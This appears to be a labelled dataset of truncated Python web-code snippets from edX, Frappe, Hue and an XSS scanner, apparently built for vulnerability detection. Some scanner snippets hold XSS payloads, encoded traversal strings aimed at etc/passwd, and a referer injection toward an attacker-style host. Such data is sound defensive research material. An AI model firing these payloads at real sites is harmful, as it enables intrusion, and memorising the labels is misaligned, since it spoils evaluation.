"code": "\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list", "label": 0}, {"snippet_id": 52559, "code": " response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\"", "label": 0}, {"snippet_id": 10462, "code": ".test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\"", "label": 0}, {"snippet_id": 44501, "code": "'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) ", "label": 0}, {"snippet_id": 53005, "code": "'editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc", "label": 1}, {"snippet_id": 17428, "code": ", 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^", "label": 0}, {"snippet_id": 7041, "code": "'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student", "label": 0}, {"snippet_id": 32374, "code": "'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown()", "label": 0}, {"snippet_id": 23892, "code": " self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var", "label": 1}, {"snippet_id": 18046, "code": "'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 54559, "code": " get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['articles']=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): ", "label": 0}, {"snippet_id": 7478, "code": "', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 16172, "code": "='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>", "label": 0}, {"snippet_id": 11599, "code": ".views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views", "label": 0}, {"snippet_id": 16614, "code": "'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',", "label": 0}, {"snippet_id": 25807, "code": ", label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField", "label": 0}, {"snippet_id": 43745, "code": ":param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0", "label": 0}, {"snippet_id": 3792, "code": "=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\":", "label": 0}, {"snippet_id": 35030, "code": "\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t", "label": 0}, {"snippet_id": 24067, "code": " suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"", "label": 0}, {"snippet_id": 35466, "code": " _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t", "label": 0}, {"snippet_id": 33714, "code": ", \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list", "label": 0}, {"snippet_id": 21596, "code": "/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 46499, "code": "(request.user).get_search_collections() if request.GET.get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile", "label": 0}, {"snippet_id": 6894, "code": " use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property", "label": 0}, {"snippet_id": 16569, "code": "'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 2212, "code": " impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": ", "label": 0}, {"snippet_id": 9013, "code": "', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name", "label": 0}, {"snippet_id": 10659, "code": " set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and", "label": 0}, {"snippet_id": 26499, "code": "%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e", "label": 0}, {"snippet_id": 37933, "code": "%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t", "label": 0}, {"snippet_id": 6155, "code": "'pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config", "label": 0}, {"snippet_id": 2068, "code": "(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result", "label": 0}, {"snippet_id": 23769, "code": ".setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 12673, "code": "+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 7118, "code": ".password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done", "label": 0}, {"snippet_id": 12390, "code": "<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading',", "label": 0}, {"snippet_id": 17044, "code": "/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups", "label": 0}, {"snippet_id": 39519, "code": " now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": ", "label": 0}, {"snippet_id": 41147, "code": ".comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\"", "label": 0}, {"snippet_id": 50552, "code": " request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init':", "label": 0}, {"snippet_id": 33395, "code": ".Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>', notifications.TaskPublishNotification), webapp2.Route( r'", "label": 0}, {"snippet_id": 32898, "code": " for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s<", "label": 0}, {"snippet_id": 13486, "code": "(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?", "label": 0}, {"snippet_id": 38252, "code": ", filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters", "label": 0}, {"snippet_id": 51082, "code": " def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at", "label": 0}, {"snippet_id": 13677, "code": "/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index", "label": 1}, {"snippet_id": 25026, "code": ".append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self", "label": 0}, {"snippet_id": 37175, "code": "\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True", "label": 0}, {"snippet_id": 37923, "code": " count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not", "label": 0}, {"snippet_id": 26018, "code": "-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request',", "label": 0}, {"snippet_id": 5569, "code": "\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content", "label": 0}, {"snippet_id": 39128, "code": " key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns", "label": 0}, {"snippet_id": 4640, "code": ", 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary',", "label": 0}, {"snippet_id": 39835, "code": "\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from", "label": 0}, {"snippet_id": 16441, "code": "), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 18950, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores')", "label": 0}, {"snippet_id": 6887, "code": "'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\"", "label": 0}, {"snippet_id": 10545, "code": " call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 19545, "code": ") class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp", "label": 0}, {"snippet_id": 23798, "code": ") name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests", "label": 0}, {"snippet_id": 20228, "code": "' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously", "label": 0}, {"snippet_id": 27235, "code": "): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\"", "label": 1}, {"snippet_id": 22960, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 30678, "code": "(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock", "label": 0}, {"snippet_id": 2555, "code": " \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result", "label": 0}, {"snippet_id": 4073, "code": " xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text", "label": 0}, {"snippet_id": 22833, "code": "/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 471, "code": " xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, ", "label": 1}, {"snippet_id": 39070, "code": "\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value", "label": 0}, {"snippet_id": 44429, "code": " HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.'))", "label": 0}, {"snippet_id": 44430, "code": "(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs", "label": 0}, {"snippet_id": 43280, "code": ".name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table", "label": 0}, {"snippet_id": 33165, "code": " buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get", "label": 0}, {"snippet_id": 40002, "code": "=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t", "label": 0}, {"snippet_id": 42809, "code": "(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname)", "label": 0}, {"snippet_id": 50490, "code": " is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect", "label": 0}, {"snippet_id": 3265, "code": "(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", ", "label": 0}, {"snippet_id": 35796, "code": "({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 45230, "code": " is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status", "label": 0}, {"snippet_id": 25973, "code": ": vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business", "label": 0}, {"snippet_id": 32661, "code": " _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for", "label": 0}, {"snippet_id": 24660, "code": "--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok", "label": 0}, {"snippet_id": 36277, "code": "\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field", "label": 0}, {"snippet_id": 31544, "code": " metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) ", "label": 0}, {"snippet_id": 24980, "code": ".start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\"", "label": 0}, {"snippet_id": 45566, "code": ".uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json,", "label": 1}, {"snippet_id": 13675, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 43992, "code": "\t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: ", "label": 0}, {"snippet_id": 25151, "code": " vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import", "label": 0}, {"snippet_id": 2018, "code": " api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,", "label": 0}, {"snippet_id": 9214, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 41037, "code": "\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published", "label": 0}, {"snippet_id": 18086, "code": "\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses", "label": 0}, {"snippet_id": 14073, "code": " name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses", "label": 0}, {"snippet_id": 47338, "code": " PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum from..models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user", "label": 0}, {"snippet_id": 27562, "code": " handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self,", "label": 0}, {"snippet_id": 14700, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite(", "label": 0}, {"snippet_id": 31054, "code": "(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP ", "label": 0}, {"snippet_id": 38749, "code": " default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value", "label": 0}, {"snippet_id": 19932, "code": "'imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir", "label": 0}, {"snippet_id": 12135, "code": "'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 21869, "code": ".MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns", "label": 0}, {"snippet_id": 9165, "code": "/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$'", "label": 1}, {"snippet_id": 37769, "code": "(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments=", "label": 0}, {"snippet_id": 12250, "code": "[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "label": 1}, {"snippet_id": 4604, "code": " 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol", "label": 0}, {"snippet_id": 18065, "code": "+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to'", "label": 0}, {"snippet_id": 10827, "code": "'save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if", "label": 0}, {"snippet_id": 30455, "code": "\tcommands=[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00", "label": 0}, {"snippet_id": 51409, "code": "/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath", "label": 0}, {"snippet_id": 25082, "code": "{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json", "label": 0}, {"snippet_id": 46240, "code": "': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False): engine=request.GET.get('engine', 'solr') collections=get_engine", "label": 0}, {"snippet_id": 10227, "code": ": suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS", "label": 1}, {"snippet_id": 26224, "code": "(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id' in self.changed_data or not", "label": 0}, {"snippet_id": 9578, "code": "/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +", "label": 0}, {"snippet_id": 4294, "code": " url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'>", "label": 1}, {"snippet_id": 3926, "code": " for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload 